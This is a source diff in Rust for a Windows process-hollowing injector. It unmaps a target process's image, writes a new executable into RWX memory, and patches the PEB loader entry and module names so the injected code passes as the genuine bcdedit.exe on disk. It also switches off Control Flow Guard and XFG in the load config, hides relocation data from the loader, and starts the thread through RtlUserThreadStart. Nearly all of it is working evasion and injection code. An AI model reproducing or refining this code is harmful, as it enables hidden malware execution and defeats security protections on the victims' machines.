@@ -7,180 +7,6 @@ use crate::*;
 
 pub mod diagnostics;
 
-// Offsets in LDR_DATA_TABLE_ENTRY (x64, Win10+)
-const DLL_BASE_OFF:       usize = 0x30;
-const ENTRY_POINT_OFF:    usize = 0x38;
-const SIZE_OF_IMAGE_OFF:  usize = 0x40;
-
-fn dump_first_ldr_entry(h_proc: HANDLE, peb_addr: *const c_void) -> anyhow::Result<()> {
-    let mut ldr_ptr: u64 = 0;
-    // PEB +0x18 -> Ldr
-    read_remote(h_proc, peb_addr as usize + 0x18, &mut ldr_ptr)?;
-
-    // first entry = *(Ldr + 0x10)
-    let mut first_entry: u64 = 0;
-    read_remote(h_proc, ldr_ptr as usize + 0x10, &mut first_entry)?;
-
-    let mut dll_base: u64 = 0;
-    let mut size_img: u32 = 0;
-    let mut entry_pt : u64 = 0;
-
-    unsafe {
-        ReadProcessMemory(
-            h_proc, 
-            (first_entry as usize + DLL_BASE_OFF)  as _,
-            &mut dll_base as *mut _ as _, 
-            8, 
-            None
-        ).context("ReadProcessMemory dll_base")?;
-        ReadProcessMemory(
-            h_proc, 
-            (first_entry as usize + SIZE_OF_IMAGE_OFF) as _,
-            &mut size_img as *mut _ as _, 
-            4, 
-            None
-        ).context("ReadProcessMemory size_img")?;
-        ReadProcessMemory(
-            h_proc, 
-            (first_entry as usize + ENTRY_POINT_OFF) as _,
-            &mut entry_pt as *mut _ as _, 
-            8, 
-            None
-        ).context("ReadProcessMemory entry_pt")?;
-    }
-
-    log::warn!("--- First LDR entry dump ---");
-    log::warn!("  DllBase      = 0x{:X}", dll_base);
-    log::warn!("  SizeOfImage  = 0x{:X}", size_img);
-    log::warn!("  EntryPoint   = 0x{:X}", entry_pt);
-    Ok(())
-}
-
-/// read exactly sizeof(T) bytes; treat ERROR_PARTIAL_COPY as success
-unsafe fn rpm_exact<T: Default + Copy>(
-    h_proc: HANDLE,
-    remote: usize,
-    out: &mut T,
-) -> anyhow::Result<()> {
-    let mut read = 0usize;
-    // ReadProcessMemory returns BOOL inside WinResult<()>
-    let status = unsafe { ReadProcessMemory(
-        h_proc,
-        remote as _,
-        out as *mut _ as _,
-        std::mem::size_of::<T>(),
-        Some(&mut read),
-    ) };
-
-    log::warn!("ReadProcessMemory Status: {status:?}");
-    // success if we obtained all bytes
-    if read == std::mem::size_of::<T>() {
-        return Ok(());
-    }
-
-    // otherwise bubble up a detailed error
-    let gle = unsafe { GetLastError() };
-    Err(anyhow::anyhow!(
-        "RPM 0x{:X} wanted {} got {}  (GLE = 0x{:X})",
-        remote,
-        std::mem::size_of::<T>(),
-        read,
-        gle.0
-    ))
-}
-
-fn read_remote<T: Default + Copy>(
-    h: HANDLE,
-    addr: usize,
-    out: &mut T,
-) -> anyhow::Result<()> {
-    let mut read = 0usize;
-    unsafe {
-        let ok = ReadProcessMemory(
-            h,
-            addr as _,
-            out as *mut _ as _,
-            std::mem::size_of::<T>(),
-                                   Some(&mut read),
-        )
-        .is_ok();
-
-        if !ok || read != std::mem::size_of::<T>() {
-            return Err(anyhow::anyhow!(
-                "RPM 0x{:X} wanted {} got {} (gle={})",
-                addr,
-                std::mem::size_of::<T>(),
-                read,
-                GetLastError().0
-            ));
-        }
-    }
-    Ok(())
-}
-
-
-fn fix_ldr_entry(h_proc: HANDLE, peb_addr: *const PEB, new_base: usize, size_of_img: usize, entry_rva: u32) -> anyhow::Result<()> {
-
-    // 1. PEB->Ldr
-    let mut ldr_ptr: u64 = 0;
-    unsafe {
-        rpm_exact(
-            h_proc,
-            peb_addr as usize + 0x18,   // PEB.Ldr
-            &mut ldr_ptr,
-        )?;
-    }
-
-    // 2. first LIST_ENTRY in InLoadOrder list (main exe)
-    let mut first_entry: u64 = 0;
-    unsafe {
-        rpm_exact(
-            h_proc,
-            ldr_ptr as usize + 0x10,    // Ldr.InLoadOrderModuleList.Flink
-            &mut first_entry,
-        )?;
-    }
-
-    // 3. patch DllBase, SizeOfImage, EntryPoint
-    let dll_base_field  = first_entry + DLL_BASE_OFF  as u64;
-    let size_field      = first_entry + SIZE_OF_IMAGE_OFF as u64;
-    let ep_field        = first_entry + ENTRY_POINT_OFF as u64;
-
-    let size32 = size_of_img as u32;
-    let new_ep = new_base + entry_rva as usize;
-
-    unsafe {
-        WriteProcessMemory(
-            h_proc, 
-            dll_base_field as _, 
-            &new_base as *const _ as _, 
-            8, 
-            None
-        ).context("WriteProcessMemory dll_base_field")?;
-
-        WriteProcessMemory(
-            h_proc, 
-            size_field as _, 
-            &size32 as *const _ as _, 
-            4, 
-            None
-        ).context("WriteProcessMemory size_field")?;
-
-        WriteProcessMemory(
-            h_proc, 
-            ep_field as _, 
-            &new_ep as *const _ as _, 
-            8, 
-            None
-        ).context("WriteProcessMemory ep_field")?;
-
-    }
-
-    log::warn!("LDR entry fixed (DllBase=0x{:X}, Size=0x{:X})", new_base, size_of_img);
-    Ok(())
-}
-
-
 impl PluginApp {
     /// A corrected and robust implementation of process hollowing for EXEs.
     pub unsafe fn hollow_process_with_exe2(
@@ -295,6 +121,17 @@ impl PluginApp {
         let remote_image_base = usize::from_le_bytes(remote_image_base_buf);
         log::info!("Original image base: 0x{:X}", remote_image_base);
 
+        // 8b. ------------ wait until loader linked lists are built --------------
+        // let the loader start doing its work
+        unsafe { ResumeThread(h_thread) };
+
+        // … poll until it has finished basic initialisation
+        let ldr_ptr = wait_for_ldr_initialized(h_process, pbi.PebBaseAddress as usize)?;
+        log::warn!("PEB->Ldr = 0x{:X}", ldr_ptr);
+
+        // freeze execution again so we can patch everything in peace
+        unsafe { SuspendThread(h_thread) };
+
         // 3. Unmap the original executable
         let status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
         log::info!("NtUnmapViewOfSection Win32: {}", unsafe { GetLastError().to_hresult().message() });
@@ -321,15 +158,47 @@ impl PluginApp {
         );
 
         // 5. Allocate memory for the new image with PAGE_EXECUTE_READWRITE
-        let new_base = unsafe {
-            VirtualAllocEx(
+        // let new_base = unsafe {
+        //     VirtualAllocEx(
+        //         h_process,
+        //         None,
+        //         size_of_image,
+        //         MEM_COMMIT | MEM_RESERVE,
+        //         PAGE_EXECUTE_READWRITE,
+        //     )
+        // } as usize;
+        
+        // 5. Allocate memory ----------------------------------------------------
+        use windows::Win32::System::Memory::{
+            VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+        };
+
+        let alloc = unsafe { VirtualAllocEx(
+            h_process,
+            Some(image_base as _),
+            size_of_image,
+            MEM_RESERVE | MEM_COMMIT,
+            PAGE_EXECUTE_READWRITE
+        ) } as usize;
+
+        let new_base = if alloc == 0 {
+            // preferred base occupied – allocate anywhere
+            unsafe { VirtualAllocEx(
                 h_process,
-                None,
+                None,                       // <-- NULL, let the kernel choose
                 size_of_image,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE,
-            )
-        } as usize;
+                MEM_RESERVE | MEM_COMMIT,
+                PAGE_EXECUTE_READWRITE
+            ) as usize } 
+        } else {
+            alloc                          // <-- keep the real pointer!
+        };
+        let relocate = new_base != image_base;
+
+
+        log::info!("Image mapped at 0x{:X}", new_base);
+
+
         log::info!("VirtualAllocEx Win32: {}", unsafe { GetLastError().to_hresult().message() });
         if new_base == 0 {
             return Err(anyhow::anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
@@ -382,17 +251,6 @@ impl PluginApp {
         };
         log::info!("Remote PEB image base updated to 0x{:X}", new_base);
 
-        loop {
-            let mut ldr_ptr: u64 = 0;
-            unsafe { rpm_exact(h_process, pbi.PebBaseAddress as usize + 0x18, &mut ldr_ptr) }?;
-
-            if ldr_ptr != 0 {
-                break;          // the lists are ready – we can patch them
-            }
-            unsafe { ResumeThread(h_thread) };                   // let the thread run a bit
-            std::thread::sleep(std::time::Duration::from_millis(2));
-            unsafe { SuspendThread(h_thread) };
-        }
 
         dump_first_ldr_entry(
             h_process, 
@@ -409,14 +267,36 @@ impl PluginApp {
             log::error!("Error fixing LDR entry: {e:?}");
         }
 
+        // Ldr->InLoadOrderModuleList.Flink  (first entry = our main EXE)
+        let mut first_entry: u64 = 0;
+        unsafe { rpm_exact(
+            h_process,
+            ldr_ptr as usize + 0x10,              // LIST_ENTRY.Flink
+            &mut first_entry,
+        ) }?;
+
+        // PEB points to the *real* bcdedit.exe on disk → keep that
+        let full_path = target_exe; // same string we passed to CreateProcessA
+        let base_name = std::path::Path::new(full_path).file_name().unwrap().to_string_lossy();
+
+        write_remote_unicode_string(
+            h_process,
+            first_entry as usize + 0x58,        // FullDllName
+            full_path,
+        )?;
+        write_remote_unicode_string(
+            h_process,
+            first_entry as usize + 0x68,        // BaseDllName
+            &base_name,
+        )?;
+        
         dump_first_ldr_entry(
             h_process, 
             pbi.PebBaseAddress as *const _
         ).context("dump_first_ldr_entry")?;
 
         // 9. relocate once
-        if new_base != image_base {
-            let delta = new_base.wrapping_sub(image_base);
+        // if relocate {
             let (guard_cd_rva, guard_lj_rva) = if let Some(cfg) = opt.data_directories.get_load_config_table() {
                 (
                     cfg.virtual_address as usize + 0x58, // GuardCFFunctionTable
@@ -430,39 +310,66 @@ impl PluginApp {
 
             // ---- patch LOAD‑CONFIG absolute pointers --------------------------
 
-            if let Some(load_cfg) = opt.data_directories.get_load_config_table() {
-                if load_cfg.virtual_address != 0 && load_cfg.size as usize >= 0x70 {
-                    let cfg_va  = new_base + load_cfg.virtual_address as usize;
+            unsafe {
 
-                    // make the page writable
-                    let mut old = PAGE_PROTECTION_FLAGS(0);
-                    unsafe { 
+                // ---- ALWAYS disable Guard CF / XFG ------------------------------
+
+                if let Some(cfg) = opt.data_directories.get_load_config_table() {
+                    if cfg.virtual_address != 0 && cfg.size as usize >= 0x90 {
+                        let cfg_va = new_base + cfg.virtual_address as usize;
+
+                        // Make the first 0x90 bytes writable
+                        let mut old = PAGE_PROTECTION_FLAGS(0);
                         VirtualProtectEx(
                             h_process,
                             cfg_va as _,
-                            0x70,                 // we touch only the first 0x70 bytes
+                            0x90,
                             PAGE_READWRITE,
                             &mut old
-                        ) 
-                    }?;
+                        )?;
 
-                    // read-modify-write
-                    let mut buf = [0u8; 0x70];
-                    unsafe { ReadProcessMemory(h_process, cfg_va as _, buf.as_mut_ptr() as _, buf.len(), None) }?;
-                    for off in [0x58usize, 0x60] {
-                        let mut p = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap());
-                        if p != 0 {
-                            p = p.wrapping_add(delta as u64);
-                            buf[off..off + 8].copy_from_slice(&p.to_le_bytes());
+                        // 1️⃣ clear GuardFlags bit-0 (CFG-Enabled) and bit-8 (XFG-Enabled)
+                        let zero_u32: u32 = 0;
+                        WriteProcessMemory(
+                            h_process,
+                            (cfg_va + 0x48) as _,
+                            &zero_u32 as *const _ as _,
+                            4,
+                            None
+                        )?;
+
+                        // 2️⃣ zero all Guard-CF / XFG pointer-count pairs
+                        let zero_u64: u64 = 0;
+                        for off in [0x40, 0x58, 0x60, 0x68, 0x70, 0x78, 0x80] {
+                            WriteProcessMemory(
+                                h_process,
+                                (cfg_va + off) as _,
+                                &zero_u64 as *const _ as _,
+                                8,
+                                None
+                            )?;
                         }
-                    }
-                    unsafe { WriteProcessMemory(h_process, cfg_va as _, buf.as_ptr() as _, buf.len(), None) }?;
 
-                    // restore original protection
-                    unsafe { VirtualProtectEx(h_process, cfg_va as _, 0x70, old, &mut old) }?;
+                        let mut flags: u32 = 0xdeadbeef;
+                        ReadProcessMemory(
+                            h_process,
+                            (cfg_va + 0x48) as _,
+                            &mut flags as *mut _ as _,
+                            4,
+                            None
+                        )?;
+                        log::info!("GuardFlags (remote) = 0x{:08x}", flags);
+
+
+                        // restore protection
+                        VirtualProtectEx(h_process, cfg_va as _, 0x90, old, &mut old)?;
+                    }
                 }
+
             }
-        }
+
+        
+        // }
 
         // hide relocation info from Ldr  → zero directory entry *and* section header
         if let Some((dir_off, _)) = opt.data_directories.data_directories[5] {
@@ -501,26 +408,21 @@ impl PluginApp {
         log::error!("GetThreadContext Win32: {}", unsafe { windows::Win32::Foundation::GetLastError().to_hresult().message() });
         #[cfg(target_arch = "x86_64")]
         {
-            context.Rsp = (context.Rsp & !0xF).wrapping_sub(8); // Align stack to 16 bytes
-            context.Rcx = new_base as u64;
-            context.Rdx = 0;
-            context.R8 = 0;
-            context.R9 = 0;
-            context.Rax = 0;
-            
-            let zero: u64 = 0;
-            unsafe { 
-                WriteProcessMemory(
-                    h_process, 
-                    context.Rsp as _, 
-                    &zero as *const u64 as *const c_void, 
-                    std::mem::size_of::<u64>(), 
-                    None
-                ) 
-            }?;
+            // address of our DLL/EXE entry
+            let entry = new_base as u64 + entry_rva as u64;
 
-            context.Rip = new_base as u64 + entry_rva as u64;
+            // address of the trampoline ntdll!RtlUserThreadStart
+            let rtl_start = unsafe { GetProcAddress(
+                GetModuleHandleA(s!("ntdll.dll")).unwrap(),
+                s!("RtlUserThreadStart")
+            ).unwrap() } as u64;
+
+            // --- build the context ---
+            context.Rcx = entry;   // 1st parameter  = function pointer
+            context.Rdx = 0;       // 2nd parameter  = argument (unused)
+            context.Rip = rtl_start;
         }
+
         #[cfg(target_arch = "x86")]
         {
             context.Eip = (new_base as u32).wrapping_add(entry_rva);
@@ -534,7 +436,7 @@ impl PluginApp {
         }
 
         // 15. Resume thread
-        log::info!("Resuming main thread...");
+        // log::info!("Resuming main thread...");
         // let resume_count = unsafe { ResumeThread(h_thread) };
         // if resume_count == u32::MAX {
         //     let err = unsafe { windows::Win32::Foundation::GetLastError() };
@@ -1628,6 +1530,282 @@ pub fn resolve_imports(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut 
     log::info!("Imports resolved successfully.");
     Ok(())
 }
+
+// Offsets in LDR_DATA_TABLE_ENTRY (x64, Win10+)
+const DLL_BASE_OFF:       usize = 0x30;
+const ENTRY_POINT_OFF:    usize = 0x38;
+const SIZE_OF_IMAGE_OFF:  usize = 0x40;
+
+fn dump_first_ldr_entry(h_proc: HANDLE, peb_addr: *const c_void) -> anyhow::Result<()> {
+    let mut ldr_ptr: u64 = 0;
+    // PEB +0x18 -> Ldr
+    read_remote(h_proc, peb_addr as usize + 0x18, &mut ldr_ptr)?;
+
+    // first entry = *(Ldr + 0x10)
+    let mut first_entry: u64 = 0;
+    read_remote(h_proc, ldr_ptr as usize + 0x10, &mut first_entry)?;
+
+    let mut dll_base: u64 = 0;
+    let mut size_img: u32 = 0;
+    let mut entry_pt : u64 = 0;
+
+    unsafe {
+        ReadProcessMemory(
+            h_proc, 
+            (first_entry as usize + DLL_BASE_OFF)  as _,
+            &mut dll_base as *mut _ as _, 
+            8, 
+            None
+        ).context("ReadProcessMemory dll_base")?;
+        ReadProcessMemory(
+            h_proc, 
+            (first_entry as usize + SIZE_OF_IMAGE_OFF) as _,
+            &mut size_img as *mut _ as _, 
+            4, 
+            None
+        ).context("ReadProcessMemory size_img")?;
+        ReadProcessMemory(
+            h_proc, 
+            (first_entry as usize + ENTRY_POINT_OFF) as _,
+            &mut entry_pt as *mut _ as _, 
+            8, 
+            None
+        ).context("ReadProcessMemory entry_pt")?;
+    }
+
+    log::warn!("--- First LDR entry dump ---");
+    log::warn!("  DllBase      = 0x{:X}", dll_base);
+    log::warn!("  SizeOfImage  = 0x{:X}", size_img);
+    log::warn!("  EntryPoint   = 0x{:X}", entry_pt);
+    Ok(())
+}
+
+/// read exactly sizeof(T) bytes; treat ERROR_PARTIAL_COPY as success
+unsafe fn rpm_exact<T: Default + Copy>(
+    h_proc: HANDLE,
+    remote: usize,
+    out: &mut T,
+) -> anyhow::Result<()> {
+    let mut read = 0usize;
+    // ReadProcessMemory returns BOOL inside WinResult<()>
+    let status = unsafe { ReadProcessMemory(
+        h_proc,
+        remote as _,
+        out as *mut _ as _,
+        std::mem::size_of::<T>(),
+        Some(&mut read),
+    ) };
+
+    log::debug!("ReadProcessMemory Status: {status:?}");
+    // success if we obtained all bytes
+    if read == std::mem::size_of::<T>() {
+        return Ok(());
+    }
+
+    // otherwise bubble up a detailed error
+    let gle = unsafe { GetLastError() };
+    Err(anyhow::anyhow!(
+        "RPM 0x{:X} wanted {} got {}  (GLE = 0x{:X})",
+        remote,
+        std::mem::size_of::<T>(),
+        read,
+        gle.0
+    ))
+}
+
+fn read_remote<T: Default + Copy>(
+    h: HANDLE,
+    addr: usize,
+    out: &mut T,
+) -> anyhow::Result<()> {
+    let mut read = 0usize;
+    unsafe {
+        let ok = ReadProcessMemory(
+            h,
+            addr as _,
+            out as *mut _ as _,
+            std::mem::size_of::<T>(),
+                                   Some(&mut read),
+        )
+        .is_ok();
+
+        if !ok || read != std::mem::size_of::<T>() {
+            return Err(anyhow::anyhow!(
+                "RPM 0x{:X} wanted {} got {} (gle={})",
+                addr,
+                std::mem::size_of::<T>(),
+                read,
+                GetLastError().0
+            ));
+        }
+    }
+    Ok(())
+}
+
+// helper: write a UNICODE_STRING (Length/MaximumLength in *bytes*)
+#[repr(C)]
+#[derive(Default, Copy, Clone)]
+#[allow(non_camel_case_types)]
+struct UNICODE_STRING64 {
+    length:        u16,
+    max_length:    u16,
+    _pad:          u32,   // alignment
+    buffer:        u64,
+}
+
+fn write_remote_unicode_string(
+    h_proc: HANDLE,
+    remote_str: usize,          // address of the UNICODE_STRING in the target
+    text: &str,
+) -> anyhow::Result<()> {
+    use std::os::windows::ffi::OsStrExt;
+    let wide: Vec<u16> = std::ffi::OsStr::new(text)
+        .encode_wide()
+        .chain(std::iter::once(0))          // trailing \0
+        .collect();
+
+    // 1) allocate remote buffer for the characters
+    let buf_size = (wide.len() * 2) as usize;
+    let remote_buf = unsafe {
+        VirtualAllocEx(h_proc, None, buf_size,
+                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+    } as usize;
+
+    unsafe {
+        WriteProcessMemory(
+            h_proc,
+            remote_buf as _,
+            wide.as_ptr() as _,
+            buf_size,
+            None,
+        )?;
+    }
+
+    // 2) build a local UNICODE_STRING
+    let us = UNICODE_STRING64 {
+        length:     ((wide.len()-1) * 2) as u16,
+        max_length: (wide.len()      * 2) as u16,
+        buffer:     remote_buf as u64,
+        ..Default::default()
+    };
+
+    // 3) write it into the target process
+    unsafe {
+        WriteProcessMemory(
+            h_proc,
+            remote_str as _,
+            &us as *const _ as _,
+            std::mem::size_of::<UNICODE_STRING64>(),
+            None,
+        )?;
+    }
+    Ok(())
+}
+
+fn fix_ldr_entry(h_proc: HANDLE, peb_addr: *const PEB, new_base: usize, size_of_img: usize, entry_rva: u32) -> anyhow::Result<()> {
+
+    // 1. PEB->Ldr
+    let mut ldr_ptr: u64 = 0;
+    unsafe {
+        rpm_exact(
+            h_proc,
+            peb_addr as usize + 0x18,   // PEB.Ldr
+            &mut ldr_ptr,
+        )?;
+    }
+
+    // 2. first LIST_ENTRY in InLoadOrder list (main exe)
+    let mut first_entry: u64 = 0;
+    unsafe {
+        rpm_exact(
+            h_proc,
+            ldr_ptr as usize + 0x10,    // Ldr.InLoadOrderModuleList.Flink
+            &mut first_entry,
+        )?;
+    }
+
+    // 3. patch DllBase, SizeOfImage, EntryPoint
+    let dll_base_field  = first_entry + DLL_BASE_OFF  as u64;
+    let size_field      = first_entry + SIZE_OF_IMAGE_OFF as u64;
+    let ep_field        = first_entry + ENTRY_POINT_OFF as u64;
+
+    let size32 = size_of_img as u32;
+    let new_ep = new_base + entry_rva as usize;
+
+    unsafe {
+        WriteProcessMemory(
+            h_proc, 
+            dll_base_field as _, 
+            &new_base as *const _ as _, 
+            8, 
+            None
+        ).context("WriteProcessMemory dll_base_field")?;
+
+        WriteProcessMemory(
+            h_proc, 
+            size_field as _, 
+            &size32 as *const _ as _, 
+            4, 
+            None
+        ).context("WriteProcessMemory size_field")?;
+
+        WriteProcessMemory(
+            h_proc, 
+            ep_field as _, 
+            &new_ep as *const _ as _, 
+            8, 
+            None
+        ).context("WriteProcessMemory ep_field")?;
+
+    }
+
+    log::warn!("LDR entry fixed (DllBase=0x{:X}, Size=0x{:X})", new_base, size_of_img);
+    Ok(())
+}
+
+fn wait_for_ldr_initialized(h_proc: HANDLE, peb_addr: usize) -> anyhow::Result<u64> {
+    use std::time::{Duration, Instant};
+
+    let start = Instant::now();
+    loop {
+        if let Some(p) = rpm_peek_u64(h_proc, peb_addr + 0x18) {
+            if p != 0 {
+                return Ok(p);
+            }
+        }
+        if start.elapsed() > Duration::from_millis(500) {
+            anyhow::bail!("loader not initialised after 500 ms");
+        }
+        std::thread::sleep(Duration::from_millis(1));
+    }
+}
+
+
+/// try-read a u64 from a remote process; return None on ERROR_PARTIAL_COPY
+fn rpm_peek_u64(h_proc: HANDLE, addr: usize) -> Option<u64> {
+    let mut val = 0u64;
+    let mut read = 0usize;
+
+    // BOOL inside WinResult<()>
+    let ok = unsafe {
+        ReadProcessMemory(
+            h_proc,
+            addr as _,
+            &mut val as *mut _ as _,
+            std::mem::size_of::<u64>(),
+            Some(&mut read),
+        )
+    }
+    .is_ok();
+
+    if ok && read == 8 {
+        Some(val)
+    } else {
+        // any error, incl. ERROR_PARTIAL_COPY → “not ready”
+        None
+    }
+}
+
 
 pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyhow::Error> {
     use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
